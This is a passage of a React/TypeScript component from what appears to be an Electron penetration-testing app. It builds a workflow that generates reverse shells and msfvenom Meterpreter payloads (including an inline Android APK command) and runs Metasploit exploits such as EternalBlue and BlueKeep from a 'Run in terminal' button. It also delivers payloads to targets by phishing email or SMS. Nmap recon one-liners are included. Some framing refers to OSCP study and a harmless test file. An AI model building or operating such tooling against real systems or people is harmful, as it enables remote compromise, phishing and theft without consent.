                                {/* Single Phishing & delivery — for any target (SMS for phone, email/link for others) */}
                                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800/50 border-gray-700' : 'bg-gray-50 border-gray-200'}`}>
                                    <p className="text-sm font-medium mb-2">Phishing &amp; delivery</p>
                                    <p className={`text-xs mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                                        Build payloads (Msfvenom / Reverse Shells), host them, then deliver via email, SMS, or link.
                                        {workflowTargetType === 'mobile' && looksLikePhoneNumber(workflowTarget) && (
                                            <> For this phone target (<span className="font-mono">{workflowTarget}</span>) you can send SMS directly from the Phishing section.</>
                                        )}
                                    </p>
                                    <button type="button" onClick={() => onNavigateTo?.('phishing')} className={`px-4 py-2 rounded-lg text-sm font-medium flex items-center gap-2 ${darkMode ? 'bg-amber-600/80 hover:bg-amber-500/80 text-white' : 'bg-amber-500 hover:bg-amber-600 text-white'}`}>
                                        <Mail size={16} /> Open Phishing &amp; delivery
                                    </button>
                                </div>

                                <div className="flex gap-2 pt-4">
                                    <button type="button" onClick={() => setWorkflowStep(3)} className="px-4 py-2 rounded-lg border">Back</button>
                                    <button type="button" onClick={() => setWorkflowStep(5)} className={`px-5 py-2.5 rounded-lg font-medium ${darkMode ? 'bg-amber-600 hover:bg-amber-500 text-white' : 'bg-amber-500 hover:bg-amber-600 text-white'}`}>
                                        Next: Exploit <ArrowRight size={16} className="inline ml-1" />
                                    </button>
                                    <button type="button" onClick={() => { setWorkflowStep(1); setWorkflowTargetType(null); setWorkflowOSSub(null); setWorkflowMobileSub(null); setScanResults(null); }} className="text-sm text-cyan-500">
                                        Start over
                                    </button>
                                </div>
                            </div>
                        )}

                        {/* Step 5: Exploit — after recon, actively exploit */}
                        {workflowStep === 5 && (
                            <div className="space-y-6">
                                <h2 className="text-lg font-semibold">5. Exploit — find vulnerabilities, then actively exploit</h2>
                                <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                                    You&apos;ve run recon. Use the tools below to run exploits against <strong className="font-mono">{workflowTarget}</strong> ({workflowTargetType}
                                    {workflowOSSub && ` ${workflowOSSub}`}{workflowMobileSub && ` ${workflowMobileSub}`}).
                                </p>
                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                                    <button type="button" onClick={() => onNavigateTo?.('active-exploits')} className={`p-4 rounded-xl border text-left ${darkMode ? 'bg-gray-800 border-gray-700 hover:border-cyan-500' : 'bg-white border-gray-200 hover:border-cyan-400'}`}>
                                        <span className="font-semibold">Active Exploits</span>
                                        <p className={`text-sm mt-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Run Metasploit exploits (EternalBlue, BlueKeep, Shellshock, etc.) against the target.</p>
                                    </button>
                                    <button type="button" onClick={() => onNavigateTo?.('payloads')} className={`p-4 rounded-xl border text-left ${darkMode ? 'bg-gray-800 border-gray-700 hover:border-cyan-500' : 'bg-white border-gray-200 hover:border-cyan-400'}`}>
                                        <span className="font-semibold">Payloads</span>
                                        <p className={`text-sm mt-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Generate payloads (Windows, Linux, Android, PHP) and host them for delivery.</p>
                                    </button>
                                    <button type="button" onClick={() => onNavigateTo?.('phishing')} className={`p-4 rounded-xl border text-left ${darkMode ? 'bg-gray-800 border-gray-700 hover:border-cyan-500' : 'bg-white border-gray-200 hover:border-cyan-400'}`}>
                                        <span className="font-semibold">Phishing &amp; delivery</span>
                                        <p className={`text-sm mt-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Send payloads via email or SMS to the target.</p>
                                    </button>
                                </div>
                                <div className="flex gap-2 pt-2">
                                    <button type="button" onClick={() => setWorkflowStep(4)} className="px-4 py-2 rounded-lg border">Back to Recon</button>
                                    <button type="button" onClick={() => { setWorkflowStep(1); setWorkflowTargetType(null); setWorkflowOSSub(null); setWorkflowMobileSub(null); setScanResults(null); }} className="text-sm text-cyan-500">Start over</button>
                                </div>
                            </div>
                        )}
                    </div>
                )}

                {mode === 'quick' && (
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                        {[
                            { id: 'shells', title: 'Reverse Shell Generator', desc: 'Bash, Python, PowerShell, PHP, Netcat & more. Get payload + listener in one click.', icon: <Terminal size={24} /> },
                            { id: 'msfvenom', title: 'Msfvenom Payloads', desc: 'Windows/Linux/Web Meterpreter & shells. Copy msfvenom command + handler.', icon: <Code size={24} /> },
                            { id: 'payloads', title: 'Payloads', desc: 'Quick payload presets and test file. Generate + host in one place.', icon: <Code size={24} /> },
                            { id: 'exploits', title: 'Service → Exploits', desc: 'Enter port or service (e.g. 445, smb) to see known CVEs and checks.', icon: <Crosshair size={24} /> },
                            { id: 'active-exploits', title: 'Active Exploits', desc: 'Run Metasploit exploits: EternalBlue, BlueKeep, Shellshock, etc.', icon: <Crosshair size={24} /> },
                            { id: 'recon', title: 'Recon Commands', desc: 'Nmap one-liners, quick scan templates.', icon: <Shield size={24} /> },
                            { id: 'web', title: 'Web Testing', desc: 'Common dirs, parameters, and quick web checks.', icon: <Globe size={24} /> },
                            { id: 'mobile', title: 'Mobile (iOS/Android)', desc: 'ADB, Frida, objection, msfvenom APK.', icon: <Smartphone size={24} /> },
                            { id: 'phishing', title: 'Phishing & Delivery', desc: 'Send exploits to target: email, SMS, payload link. Templates and workflow.', icon: <Mail size={24} /> },
                            { id: 'monitor', title: 'Network Monitor', desc: 'Live connections (netstat), live packet capture, SIEM-style alerts.', icon: <Activity size={24} /> },
                            { id: 'pe', title: 'Privilege Escalation', desc: 'Linux & Windows PE cheatsheets.', icon: <Server size={24} /> },
                            { id: 'oscp', title: 'OSCP Helper', desc: 'Exam tips, report structure, time management.', icon: <BookOpen size={24} /> }
                        ].map(card => (
                            <button
                                key={card.id}
                                onClick={() => onNavigateTo?.(card.id as PentestTab)}
                                className={`text-left p-5 rounded-xl border transition-all flex gap-4 ${darkMode ? 'bg-gray-800/50 border-gray-700 hover:border-cyan-500/50 hover:bg-gray-800' : 'bg-gray-50 border-gray-200 hover:border-cyan-400 hover:bg-white'}`}
                            >
                                <div className={`p-2 rounded-lg shrink-0 ${darkMode ? 'bg-cyan-500/20 text-cyan-400' : 'bg-cyan-100 text-cyan-600'}`}>
                                    {card.icon}
                                </div>
                                <div className="min-w-0">
                                    <div className="font-semibold text-base mb-1">{card.title}</div>
                                    <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>{card.desc}</p>
                                    <span className="inline-flex items-center gap-1 text-xs font-medium text-cyan-500 mt-2">
                                        Open <ChevronRight size={12} />
                                    </span>
                                </div>
                            </button>
                        ))}
                    </div>
                )}

                {mode === 'shells' && (
                    <div className="space-y-6 max-w-4xl">
                        <div className={`p-4 rounded-xl border text-sm ${darkMode ? 'bg-gray-800/50 border-gray-700 text-gray-300' : 'bg-gray-50 border-gray-200 text-gray-700'}`}>
                            <strong>What is a reverse shell?</strong> It&apos;s a one-liner you run on the target machine. That code connects back to <em>your</em> computer so you can run commands on the target. <strong>Step 1:</strong> Start the listener on your machine (copy the &quot;Listener&quot; command below and run it in a terminal). <strong>Step 2:</strong> Run the payload on the target (e.g. paste it into a vulnerable input, or run it via an exploit). Pick the language that fits the target (e.g. Bash for Linux, PowerShell for Windows).
                        </div>
                        <div className="flex flex-wrap gap-4">
                            <label>
                                <span className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Language</span>
                                <select
                                    value={shellLang}
                                    onChange={e => setShellLang(e.target.value as ShellLanguage)}
                                    className={`px-3 py-2 rounded-lg border text-sm ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                                >
                                    {getAvailableLanguages().map(l => (
                                        <option key={l.id} value={l.id}>{l.name} ({l.platform})</option>
                                    ))}
                                </select>
                            </label>
                            <label>
                                <span className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Type</span>
                                <select
                                    value={shellType}
                                    onChange={e => setShellType(e.target.value as 'reverse' | 'bind')}
                                    className={`px-3 py-2 rounded-lg border text-sm ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                                >
                                    <option value="reverse">Reverse</option>
                                    {supportsBind(shellLang) && <option value="bind">Bind</option>}
                                </select>
                            </label>
                        </div>
                        {generatedShell && (
                            <>
                                <div>
                                    <div className={`text-xs font-semibold uppercase tracking-wider mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Payload (run on target)</div>
                                    <pre className={`p-4 rounded-lg border overflow-x-auto text-sm font-mono ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                        {generatedShell.payload}
                                    </pre>
                                    <CopyButton text={generatedShell.payload} label="Copy payload" darkMode={darkMode} />
                                </div>
                                <div>
                                    <div className={`text-xs font-semibold uppercase tracking-wider mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Listener (run on your machine)</div>
                                    <pre className={`p-4 rounded-lg border overflow-x-auto text-sm font-mono ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                        {generatedShell.listener}
                                    </pre>
                                    <CopyButton text={generatedShell.listener || ''} label="Copy listener" darkMode={darkMode} />
                                </div>
                            </>
                        )}
                    </div>
                )}

                {mode === 'msfvenom' && (
                    <div className="space-y-6 max-w-4xl">
                        <div className={`p-4 rounded-xl border text-sm ${darkMode ? 'bg-gray-800/50 border-gray-700 text-gray-300' : 'bg-gray-50 border-gray-200 text-gray-700'}`}>
                            <strong>What is Msfvenom?</strong> It&apos;s a tool (from Metasploit) that creates payload files — e.g. an .exe for Windows or .php for a web server. You run the <strong>msfvenom command</strong> on your machine to generate the file, then you get that file onto the target (upload, exploit, etc.). You must also start a <strong>listener</strong> in Metasploit (the &quot;handler&quot; command below) before the target runs your file. Copy both commands; run msfvenom first to create the file, then start the handler.
                        </div>
                        <label>
                            <span className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Payload template</span>
                            <select
                                value={msfTemplateId}
                                onChange={e => setMsfTemplateId(e.target.value)}
                                className={`w-full max-w-xl px-3 py-2 rounded-lg border text-sm ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                            >
                                {payloadTemplates.map(t => (
                                    <option key={t.id} value={t.id}>{t.name} — {t.platform}</option>
                                ))}
                            </select>
                        </label>
                        {msfTemplate && (
                            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>{msfTemplate.description}</p>
                        )}
                        {msfvenomCommand && (
                            <>
                                <div>
                                    <div className={`text-xs font-semibold uppercase tracking-wider mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Msfvenom command</div>
                                    <pre className={`p-4 rounded-lg border overflow-x-auto text-sm font-mono ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                        {msfvenomCommand}
                                    </pre>
                                    <CopyButton text={msfvenomCommand} label="Copy command" darkMode={darkMode} />
                                </div>
                                <div>
                                    <div className={`text-xs font-semibold uppercase tracking-wider mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Metasploit handler (msfconsole)</div>
                                    <pre className={`p-4 rounded-lg border overflow-x-auto text-sm font-mono whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                        {handlerCommand}
                                    </pre>
                                    <CopyButton text={handlerCommand} label="Copy handler" darkMode={darkMode} />
                                </div>
                            </>
                        )}
                    </div>
                )}

                {mode === 'exploits' && (
                    <div className="space-y-6 max-w-4xl">
                        <div className={`p-4 rounded-xl border text-sm ${darkMode ? 'bg-gray-800/50 border-gray-700 text-gray-300' : 'bg-gray-50 border-gray-200 text-gray-700'}`}>
                            <strong>Why enter a port or service?</strong> After recon you&apos;ll see open ports (e.g. 22, 80, 445). Here you look up <strong>known vulnerabilities</strong> for that port or service name. You get CVE numbers and short descriptions — then you can search for exploits (e.g. on Exploit-DB or Metasploit) and use Reverse Shells or Msfvenom to get a shell.
                        </div>
                        <div>
                            <label className={`block text-sm font-medium mb-2 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Enter port number or service name (e.g. 445, 22, smb, ssh, http)
                            </label>
                            <input
                                type="text"
                                value={portInput}
                                onChange={e => setPortInput(e.target.value)}
                                placeholder="e.g. 445 or smb"
                                className={`w-full max-w-xs px-4 py-2 rounded-lg border font-mono text-sm ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                            />
                        </div>
                        {exploitVulns.length > 0 && (
                            <div className="overflow-x-auto">
                                <table className="w-full text-sm">
                                    <thead>
                                        <tr className={darkMode ? 'text-gray-400 border-b border-gray-700' : 'text-gray-500 border-b border-gray-200'}>
                                            <th className="text-left py-2 pr-4">Severity</th>
                                            <th className="text-left py-2 pr-4">Name</th>
                                            <th className="text-left py-2 pr-4">CVE</th>
                                            <th className="text-left py-2">Description</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {exploitVulns.map((v, i) => (
                                            <tr key={i} className={darkMode ? 'border-b border-gray-700/50' : 'border-b border-gray-100'}>
                                                <td className="py-2 pr-4">
                                                    <span className={`px-2 py-0.5 rounded text-xs font-medium border ${SEVERITY_COLORS[v.severity] || SEVERITY_COLORS.info}`}>
                                                        {v.severity}
                                                    </span>
                                                </td>
                                                <td className="py-2 pr-4 font-medium">{v.name}</td>
                                                <td className="py-2 pr-4 font-mono text-xs">{v.cve || '—'}</td>
                                                <td className={`py-2 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>{v.description}</td>
                                            </tr>
                                        ))}
                                    </tbody>
                                </table>
                            </div>
                        )}
                        {portInput.trim() && exploitVulns.length === 0 && (
                            <p className={darkMode ? 'text-gray-400' : 'text-gray-500'}>No known vulnerabilities for this port/service. Try a different port (e.g. 21, 22, 80, 443, 445, 3389, 6379).</p>
                        )}
                    </div>
                )}

                {mode === 'active-exploits' && (
                    <div className="space-y-6 max-w-4xl">
                        <div className={`p-4 rounded-xl border text-sm ${darkMode ? 'bg-gray-800/50 border-gray-700 text-gray-300' : 'bg-gray-50 border-gray-200 text-gray-700'}`}>
                            <strong>Preselected exploits.</strong> Pick one from the list below — these are known Metasploit modules that work. Set RHOST (target IP), LHOST/LPORT (your listener), then copy the script or run it in a terminal (Electron). Requires Metasploit Framework.
                        </div>
                        <div>
                            <label className={`block text-sm font-medium mb-2 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Choose an exploit</label>
                            <select
                                value={selectedExploitId}
                                onChange={e => setSelectedExploitId(e.target.value)}
                                className={`w-full max-w-xl px-3 py-2.5 rounded-lg border text-sm ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                            >
                                {msfExploits.map((ex) => (
                                    <option key={ex.id} value={ex.id}>{ex.name} {ex.cve ? `— ${ex.cve}` : ''}</option>
                                ))}
                            </select>
                        </div>
                        <div className="flex flex-wrap gap-4">
                            <div>
                                <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>RHOST (target IP)</label>
                                <input type="text" value={exploitRhost} onChange={e => setExploitRhost(e.target.value)} placeholder="192.168.1.10" className={`w-40 px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                            </div>
                            <div>
                                <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>LHOST</label>
                                <input type="text" value={lhost} onChange={e => setLhost(e.target.value)} placeholder="10.10.14.1" className={`w-40 px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                            </div>
                            <div>
                                <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>LPORT</label>
                                <input type="text" value={lport} onChange={e => setLport(e.target.value)} placeholder="443" className={`w-24 px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                            </div>
                        </div>
                        {(() => {
                            const ex = msfExploits.find(e => e.id === selectedExploitId) ?? msfExploits[0];
                            if (!ex) return null;
                            const script = getMsfconsoleCommands(ex, { rhost: exploitRhost || '<RHOST>', lhost, lport });
                            return (
                                <div className={`p-5 rounded-xl border-2 ${darkMode ? 'bg-gray-800 border-cyan-500/50' : 'bg-white border-cyan-400'}`}>
                                    <div className="flex flex-wrap items-center gap-2 mb-2">
                                        <span className={`px-2 py-0.5 rounded text-xs font-medium border ${SEVERITY_COLORS[ex.severity]}`}>{ex.severity}</span>
                                        <strong>{ex.name}</strong>
                                        {ex.cve && <span className="font-mono text-xs">{ex.cve}</span>}
                                    </div>
                                    <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>{ex.description}</p>
                                    <pre className={`p-3 rounded-lg font-mono text-xs whitespace-pre overflow-x-auto ${darkMode ? 'bg-gray-900 border border-gray-700 text-gray-200' : 'bg-gray-100 border border-gray-200 text-gray-800'}`}>{script}</pre>
                                    <div className="flex flex-wrap gap-2 mt-2">
                                        <CopyButton text={script} label="Copy msfconsole" darkMode={darkMode} />
                                        {isElectron && exploitRhost.trim() && (
                                            <button type="button" onClick={async () => { try { await (window as any).ipcRenderer.invoke('run-msf-exploit', { script }); } catch { /* ignore */ } }} className={`px-3 py-1.5 rounded-lg text-sm font-medium ${darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white'}`}>
                                                Run in terminal
                                            </button>
                                        )}
                                    </div>
                                </div>
                            );
                        })()}
                        <details className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800/50 border-gray-700' : 'bg-gray-50 border-gray-200'}`}>
                            <summary className={`cursor-pointer text-sm font-medium ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Show all preselected exploits</summary>
                            <div className="space-y-3 mt-3">
                                {msfExploits.map((ex) => {
                                    const script = getMsfconsoleCommands(ex, { rhost: exploitRhost || '<RHOST>', lhost, lport });
                                    return (
                                        <div key={ex.id} className={`p-3 rounded-lg border ${darkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'}`}>
                                            <div className="flex flex-wrap items-center gap-2 mb-1">
                                                <span className={`px-2 py-0.5 rounded text-xs font-medium border ${SEVERITY_COLORS[ex.severity]}`}>{ex.severity}</span>
                                                <strong className="text-sm">{ex.name}</strong>
                                                {ex.cve && <span className="font-mono text-xs">{ex.cve}</span>}
                                                <button type="button" onClick={() => setSelectedExploitId(ex.id)} className="text-xs text-cyan-500 ml-auto">Use this one</button>
                                            </div>
                                            <pre className={`p-2 rounded font-mono text-xs whitespace-pre overflow-x-auto ${darkMode ? 'bg-gray-900 text-gray-300' : 'bg-gray-100 text-gray-800'}`}>{script}</pre>
                                            <div className="flex gap-2 mt-1">
                                                <CopyButton text={script} label="Copy" darkMode={darkMode} />
                                                {isElectron && exploitRhost.trim() && (
                                                    <button type="button" onClick={async () => { try { await (window as any).ipcRenderer.invoke('run-msf-exploit', { script }); } catch { /* ignore */ } }} className="text-xs px-2 py-1 rounded bg-cyan-600 text-white">Run</button>
                                                )}
                                            </div>
                                        </div>
                                    );
                                })}
                            </div>
                        </details>
                    </div>
                )}

                {mode === 'payloads' && (
                    <div className="space-y-6 max-w-4xl">
                        <div className={`p-4 rounded-xl border text-sm ${darkMode ? 'bg-gray-800/50 border-gray-700 text-gray-300' : 'bg-gray-50 border-gray-200 text-gray-700'}`}>
                            <strong>Preselected payloads (these work).</strong> Pick one from the list — copy the msfvenom command to generate the file, then copy the handler and start it first. Host the file via Phishing → Host payload, or use the safe test file (Electron) to verify delivery.
                        </div>
                        <div>
                            <label className={`block text-sm font-medium mb-2 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Choose a payload</label>
                            <select
                                value={selectedPayloadPresetId}
                                onChange={e => setSelectedPayloadPresetId(e.target.value)}
                                className={`w-full max-w-xl px-3 py-2.5 rounded-lg border text-sm ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                            >
                                <option value="win-meterpreter-tcp">Windows Meterpreter (exe)</option>
                                <option value="linux-meterpreter-tcp">Linux Meterpreter (elf)</option>
                                <option value="android-apk">Android APK (Meterpreter)</option>
                                <option value="php-meterpreter">PHP Meterpreter</option>
                            </select>
                        </div>
                        {(() => {
                            const presets = [
                                { id: 'win-meterpreter-tcp', name: 'Windows Meterpreter (Reverse TCP)', cmd: () => buildMsfvenomCommand({ payload: 'windows/x64/meterpreter/reverse_tcp', lhost, lport: parseInt(lport, 10) || 443, format: 'exe' }), handler: () => generateHandlerCommands({ payload: 'windows/x64/meterpreter/reverse_tcp', lhost, lport: parseInt(lport, 10) || 443, format: 'exe' }) },
                                { id: 'linux-meterpreter-tcp', name: 'Linux Meterpreter (Reverse TCP)', cmd: () => buildMsfvenomCommand({ payload: 'linux/x64/meterpreter/reverse_tcp', lhost, lport: parseInt(lport, 10) || 443, format: 'elf' }), handler: () => generateHandlerCommands({ payload: 'linux/x64/meterpreter/reverse_tcp', lhost, lport: parseInt(lport, 10) || 443, format: 'elf' }) },
                                { id: 'android-apk', name: 'Android APK (Meterpreter)', cmd: () => `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${parseInt(lport, 10) || 443} -o payload.apk`, handler: () => generateHandlerCommands({ payload: 'android/meterpreter/reverse_tcp', lhost, lport: parseInt(lport, 10) || 443, format: 'raw' }) },
                                { id: 'php-meterpreter', name: 'PHP Meterpreter', cmd: () => buildMsfvenomCommand({ payload: 'php/meterpreter/reverse_tcp', lhost, lport: parseInt(lport, 10) || 443, format: 'raw' }), handler: () => generateHandlerCommands({ payload: 'php/meterpreter/reverse_tcp', lhost, lport: parseInt(lport, 10) || 443, format: 'raw' }) }
                            ];
                            const preset = presets.find(p => p.id === selectedPayloadPresetId) ?? presets[0];
                            if (!preset) return null;
                            const cmdStr = preset.cmd();
                            const handlerStr = preset.handler();
                            return (
                                <div className={`p-5 rounded-xl border-2 ${darkMode ? 'bg-gray-800 border-cyan-500/50' : 'bg-white border-cyan-400'}`}>
                                    <h3 className="font-semibold mb-3">{preset.name}</h3>
                                    <div className="mb-3">
                                        <span className={`text-xs font-medium ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>1. Generate file (msfvenom)</span>
                                        <pre className={`p-3 rounded-lg font-mono text-xs overflow-x-auto mt-1 ${darkMode ? 'bg-gray-900 text-gray-200' : 'bg-gray-100 text-gray-800'}`}>{cmdStr}</pre>
                                        <CopyButton text={cmdStr} label="Copy command" darkMode={darkMode} />
                                    </div>
                                    <div>
                                        <span className={`text-xs font-medium ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>2. Start listener first (msfconsole)</span>
                                        <pre className={`p-3 rounded-lg font-mono text-xs whitespace-pre overflow-x-auto mt-1 ${darkMode ? 'bg-gray-900 text-gray-200' : 'bg-gray-100 text-gray-800'}`}>{handlerStr}</pre>
                                        <CopyButton text={handlerStr} label="Copy handler" darkMode={darkMode} />
                                    </div>
                                </div>
                            );
                        })()}
                        <details className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800/50 border-gray-700' : 'bg-gray-50 border-gray-200'}`}>
                            <summary className={`cursor-pointer text-sm font-medium ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Show all preselected payloads</summary>
                            <div className="grid gap-3 mt-3">
                                {[
                                    { id: 'win-meterpreter-tcp', name: 'Windows Meterpreter (exe)' },
                                    { id: 'linux-meterpreter-tcp', name: 'Linux Meterpreter (elf)' },
                                    { id: 'android-apk', name: 'Android APK' },
                                    { id: 'php-meterpreter', name: 'PHP Meterpreter' }
                                ].map((p) => (
                                    <button key={p.id} type="button" onClick={() => setSelectedPayloadPresetId(p.id)} className={`text-left p-3 rounded-lg border ${darkMode ? 'bg-gray-800 border-gray-700 hover:border-cyan-500/50' : 'bg-white border-gray-200 hover:border-cyan-400'}`}>
                                        {p.name} <span className="text-cyan-500 text-sm">Use this one</span>
                                    </button>
                                ))}
                            </div>
                        </details>
                        {isElectron && (
                            <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'}`}>
                                <h3 className="font-semibold mb-2">Test file (safe)</h3>
                                <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Create a harmless HTML file and host it so you get a URL to test email/SMS delivery without real malware.</p>
                                <button type="button" onClick={async () => { try { const res = await (window as any).ipcRenderer.invoke('create-test-payload-file'); if (res.success && res.path) { setPayloadFilePath(res.path); setPayloadServerUrl(null); onNavigateTo?.('phishing'); } } catch { /* ignore */ } }} className={`px-4 py-2 rounded-lg text-sm font-medium ${darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white'}`}>
                                    Create test file and go to Phishing
                                </button>
                            </div>
                        )}
                    </div>
                )}

                {mode === 'recon' && (
                    <div className="space-y-6 max-w-4xl">
                        <div className={`p-4 rounded-xl border text-sm ${darkMode ? 'bg-gray-800/50 border-gray-700 text-gray-300' : 'bg-gray-50 border-gray-200 text-gray-700'}`}>
                            <strong>What is recon?</strong> Reconnaissance means gathering information about the target. These <strong>Nmap</strong> commands scan the target&apos;s ports and services. Replace <code className="px-1.5 py-0.5 rounded bg-gray-700 text-gray-200">&lt;TARGET&gt;</code> with the target IP or hostname. Run them in a terminal (Nmap must be installed). Start with &quot;Quick TCP&quot; then try &quot;Full TCP&quot; if you need more.
                        </div>
                        <h3 className="font-semibold text-lg">Nmap one-liners</h3>
                        {[
                            { label: 'Quick TCP (top 1000)', cmd: 'nmap -sV -sC -oA quick <TARGET>' },
                            { label: 'Full TCP', cmd: 'nmap -p- -sV -sC -oA full <TARGET>' },
                            { label: 'UDP top 100', cmd: 'sudo nmap -sU --top-ports 100 -sV -oA udp <TARGET>' },
                            { label: 'Aggressive + scripts', cmd: 'nmap -A -T4 -p- -oA aggressive <TARGET>' },
                            { label: 'Quick + version', cmd: 'nmap -sV -sC -Pn -oA quick_pn <TARGET>' }
                        ].map(({ label, cmd }) => (
                            <div key={label}>
                                <div className={`text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>{label}</div>
                                <pre className={`p-3 rounded-lg border font-mono text-sm ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>{cmd}</pre>
                                <CopyButton text={cmd} darkMode={darkMode} />
                            </div>
                        ))}
                    </div>
                )}

                {mode === 'monitor' && (
                    <div className="space-y-6 max-w-4xl">
                        <div className={`p-4 rounded-xl border text-sm ${darkMode ? 'bg-gray-800/50 border-gray-700 text-gray-300' : 'bg-gray-50 border-gray-200 text-gray-700'}`}>
                            <strong>SIEM-style network monitor.</strong> Use <strong>Live connections</strong> to see this PC&apos;s traffic. Use <strong>Who&apos;s on my network</strong> to scan your home WiFi (IP + MAC), mark your devices as Known, and spot any unknown device. Packet capture is optional (see <code className="px-1 rounded bg-gray-700/50">build/capture/</code>).
                        </div>

                        {/* Live connections — show first so users see website traffic without packet capture */}
                        {isElectron && (
                            <div className={`p-5 rounded-xl border-2 ${darkMode ? 'bg-gray-800/80 border-cyan-500/50' : 'bg-white border-cyan-200 shadow-sm'}`}>
                                <h3 className="font-semibold text-lg mb-1 flex items-center gap-2">
                                    <Activity size={18} /> Live connections
                                </h3>
                                <p className={`text-sm mb-4 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                    Active connections (e.g. to websites) are listed first. Open a site in your browser, then refresh to see it here.
                                </p>
                                <div className="flex flex-wrap items-center gap-2 mb-3">
                                    <button
                                        type="button"
                                        disabled={liveConnectionsLoading}
                                        onClick={async () => {
                                            setLiveConnectionsError(null);
                                            setLiveConnectionsLoading(true);
                                            try {
                                                const res = await (window as any).ipcRenderer.invoke('get-live-connections');
                                                if (res.success) setLiveConnections(res.connections || []);
                                                else setLiveConnectionsError(res.error || 'Failed to get connections');
                                            } catch (e) {
                                                const msg = e instanceof Error ? e.message : 'Failed';
                                                setLiveConnectionsError(msg.includes('No handler registered') ? 'Restart the desktop app (or run npm run build) to enable live connections.' : msg);
                                            }
                                            setLiveConnectionsLoading(false);
                                        }}
                                        className={`px-4 py-2 rounded-lg text-sm font-medium flex items-center gap-2 ${liveConnectionsLoading ? 'opacity-50 cursor-wait ' : ''}${darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white'}`}
                                    >
                                        {liveConnectionsLoading ? <Loader2 size={16} className="animate-spin" /> : null}
                                        Refresh
                                    </button>
                                    {liveConnections.length > 0 && (
                                        <span className={`text-xs ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                            {liveConnections.filter(c => c.state.toUpperCase().includes('ESTABLISHED')).length} active
                                        </span>
                                    )}
                                </div>
                                {liveConnectionsError && <p className="text-sm text-red-500 mb-2">{liveConnectionsError}</p>}
                                <div className="overflow-x-auto max-h-96 overflow-y-auto rounded-lg border border-gray-600/50 dark:border-gray-600">
                                    <table className="w-full text-sm">
